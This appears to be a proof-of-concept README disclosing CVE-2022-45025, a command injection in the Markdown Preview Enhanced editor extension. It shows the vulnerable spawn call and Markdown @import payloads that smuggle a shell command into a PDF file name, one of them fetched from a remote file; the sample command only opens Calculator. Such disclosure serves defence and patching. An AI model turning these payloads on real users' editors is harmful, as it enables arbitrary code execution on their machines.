# CVE-2022-45025
Command injection via PDF import in Markdown Preview Enhanced (VSCode, Atom)

Vulnerable code snippet:
```js
const task = spawn(
      "pdf2svg",
      [
        `"${pdfFilePath}"`,
        `"${path.resolve(svgDirectoryPath, svgFilePrefix + "%d.svg")}"`,
        "all",
      ],
      { shell: true },
    )
```

The following Markdown document allows an attacker to execute arbitary command:

```md
@import "$(open -a Calculator > /dev/null | exit 0)hello.pdf"

The following comment will be recognised by MPE as valid "@import" command:

<!-- @import "$(open -a Calculator > /dev/null | exit 0)hello.pdf" -->
```

Alternatively, the payload could be executed from external source:
```md
<!-- @import "https://github.com/yuriisanin/CVE-2022-45025/blob/88808675c6c94fa6ed0daad09eba2f4f5fc76781/examples/malicious-md.md" -->
```

**DEMO for VSCode**

[![CVE-2022-45025 Demo for VSCode](https://img.youtube.com/vi/bnK5DPdb5JU/0.jpg)](https://www.youtube.com/watch?v=bnK5DPdb5JU)

**DEMO for Atom**

[![CVE-2022-45025 Demo for Atom](https://img.youtube.com/vi/WxMVwkYrDzI/0.jpg)](https://www.youtube.com/watch?v=WxMVwkYrDzI)
